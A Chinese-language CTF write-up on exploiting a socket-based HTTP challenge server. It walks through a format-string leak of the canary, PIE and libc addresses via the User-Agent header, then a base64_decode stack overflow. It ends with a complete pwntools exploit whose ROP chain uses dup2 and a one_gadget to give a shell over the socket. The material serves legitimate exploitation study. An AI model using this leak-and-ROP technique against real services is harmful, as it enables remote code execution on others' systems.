    今晚了解一下web+pwn的题目是怎样的，然后看到了这篇文章，感觉还不错，大致看了一遍能看懂。感觉好奇妙，web和pwn的梦幻联动。

    先贴上原文章以表尊敬：https://www.anquanke.com/post/id/168705

    主要从子进程调试、socket通信方面讨论如何解决这类基于socket服务的pwn题。

    分析

    题目给了一个基于socket的server(保护全开)以及libc.so
    把server程序跑起来，通过浏览器访问 http://localhost:1337，出现了一个页面，表示预留了一个通过GET请求的接口

    页面文字给出一个了请求example： GET/?parameter=base_string
    由于题目多次提示了 toy parameter
    所以发现可以这样调用：

    /?toy=base64_string

    比如请求hello world页面，传入hello world的base64编码aGVsbG8gd29ybGQ=
    于是请求：

    http://localhost:1337/?toy=aGVsbG8gd29ybGQ=

    得到的页面显示：

    Santa will bring you the hello world this year

    看来像是把我们的base64编码的输入给输出来了。

    于是开始检验这里有没有溢出漏洞
    传入一个超长串的base64编码，结果网页直接崩掉，server的启动终端提示stack smashing，说明已经发生溢出了，但是有canary。下面找找可以info leak的洞

    Bypass Canary：

    route函数中有一处fsb （print(v2)）可以用于泄漏stack cookie。

    下面说说调试方法：
    一般的pwn题，直接通过socat起来，然后远程连接（我好像没这么干过欸，下次找教程试试），要调试的只有一个进程；对于socket服务，当接收到请求时，会fork出来一个子进程，该子进程的内存空间布局与父进程一致，所以这几次会话时泄漏出来的Canary也都将完全一致。
    直接在子进程代码中下断点，程序是不会断下的，需要先设置跟随子进程

    set follow-fork-mode child。

    先在route处下断，设置跟随子进程，运行下面这段leak脚本：

    #! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
def _request(gift,fmt,ctl):
    req = "GET /?toy={} HTTP/1.1rn".format(gift)
    req += "User-Agent: {}rn".format(fmt)
    s=remote("localhost",1337,level="error")
    s.s(req)
    try:
        if not ctl:
            return re.findall("<br>(.*?)</small>", s.recvall())[0][10:]
        else:
            return s.irt()
    except EOFError:
        return None
    finally:
        s.close()

def pwn():
    leak = _request(b64e('wooy0ung'),'%p '*200,False).split(' '

if __name__ == '__main__':
    pwn()

    现在断在了route函数中printf调用的地方，此时查看栈上可以看到canary值。
    通过vmmap查看内存布局，这样pie_base、libc_base也就知道了。

    由于上面的leak脚本是输入了200个%p，所以总共泄露出来200个地址。我们仔细发现还是能找到端倪的。具体图片看原文章。

    偏移为0的地址是PIE地址。
    偏移为6的地址是canary值。
    偏移为36的地址是libc地址。

    对比之前vmmap得到的基址，我们就可以确定与基址的偏移：

    0x0000555555556006 - 0x0000555555554000 = 0x2006    # PIE偏移
0x00007ffff7a2d830 - 0x00007ffff7a0d000 = 0x20830   # Libc偏移

    于是下一次运行程序时我们就可以通过已知偏移+基址得到 实际的内存地址。

    开始栈溢出：

    关于溢出点，找了好久，server设置跟随子进程，跑一下下面这段poc：

    #! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
def pwn():
    pl = "QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4"
    pl += "QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3"
    pl += "QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2"
    pl += "QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc=    "
    req = "GET /?toy={} HTTP/1.1rn".format(pl)
    s=remote("localhost",1337,level="error")
    s.s(req)

if __name__ == '__main__':
    pwn()

    填充之前我们观察正常状态下的栈的分布以及数据。看到canary的地址是0x7fffffffd928

    等栈被填充垃圾数据，溢出，造成子进程崩溃的时候，我们再来栈回溯，发现调用stack_check_fail函数的下一句出现了parse_query_string字眼，也就是说在parse_query_string处开始崩的。于是我们重新跟随子进程，停在base64_decode函数调用的地方。
    在函数调用填充前看正常数据，以及填充后看垃圾数据，两者进行对比。

    发现垃圾数据是在0x7fffffffd8e0处开始填入的。而我们之前发现的canary的地址是0x7fffffffd928，于是可以计算处栈大小（tack_cookie的偏移）为 0x928-0x8e0 = 0x48

    查看函数base64decode的相关代码，最后确认溢出点在这里，a2是在调用base64decode传入的一个局部数组。 没图hhh，自己看原文章叭。

    查看栈布局，a2的缓冲区大小果然只有0x48，当越界了就会发生溢出

    ROP chains：

    现在已经分析完了，下面就是常规栈溢出的做法了，只是要注意现在是在socket服务下的利用，还需要将标准输入、输出重定向到sockfd。

    完整EXP：

    #! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os, sys
import requests
import re

DEBUG = 4
context.arch = 'amd64'
context.log_level = 'debug'
elf = ELF('./server',checksec=False)

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

if DEBUG == 1:
    libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)
    s = process('./toy')
elif DEBUG == 2:
    libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)
    s = process('./toy', env={'LD_PRELOAD':'/root/workspace/expmake/libc_x64'})
elif DEBUG == 3:
    libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)
    ip = 'localhost' 
    port = 1337
    s = remote(ip,port)
elif DEBUG == 4:
    libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)

def _request(gift,fmt,ctl):
    req = "GET /?toy={} HTTP/1.1rn".format(gift)
    req += "User-Agent: {}rn".format(fmt)

    s=remote("localhost",1337,level="error")
    s.s(req)
    try:
        if not ctl:
            return re.findall("<br>(.*?)</small>", s.recvall())[0][10:]
        else:
            return s.irt()
    except EOFError:
        return None
    finally:
        s.close()

def pwn():
    leak = _request(b64e('wooy0ung'),'%p '*200,False).split(' ')
    #print leak

    pie_base = int(leak[0], 16) - 0x2006    # 0x0000555555556006-0x0000555555554000 = 0x2006
    stack_cookie = int(leak[6], 16)
    libc.address = int(leak[36],16) - 0x20830    # 0x7ffff7a2d830-0x00007ffff7a0d000 = 0x20830

    info("0x%x pie_base",pie_base)
    info("0x%x stack_cookie",stack_cookie)
    info("0x%x libc.address",libc.address)

    '''
    pl = "QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4"
    pl += "QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3"
    pl += "QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2"
    pl += "QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc=    "
    req = "GET /?toy={} HTTP/1.1rn".format(pl)
    s=remote("localhost",1337,level="error")
    s.s(req)
    '''
    ret = pie_base + 0x0000000000000c4e
    rdi = pie_base + 0x0000000000001d9b
    rsi_r15 = pie_base + 0x0000000000001d99
    rdx_rsi = libc.address + 0x00000000001150c9

    #1.Smash stack bypass
    pl = ''
    pl += 'a'*0x48
    pl += p64(stack_cookie)
    #2.Call dup2(4,1) [out]
    pl += p64(ret)*4
    pl += p64(rdi)
    pl += p64(4)
    pl += p64(rdx_rsi)
    pl += 'a'*8
    pl += p64(1)
    pl += p64(libc.sym['dup2'])
    #3.Call dup2(4,0) [in]
    pl += p64(ret)*4
    pl += p64(rdi)
    pl += p64(4)
    pl += p64(rdx_rsi)
    pl += 'a'*8
    pl += p64(0)
    pl += p64(libc.sym['dup2'])
    #4.Call system('/bin/sh')
    pl += p64(ret)
    pl += p64(libc.address+0x45216) # one_gadget
    pl.rjust(200,'x00')

    _request(b64e(pl),'',True)

if __name__ == '__main__':
    pwn()
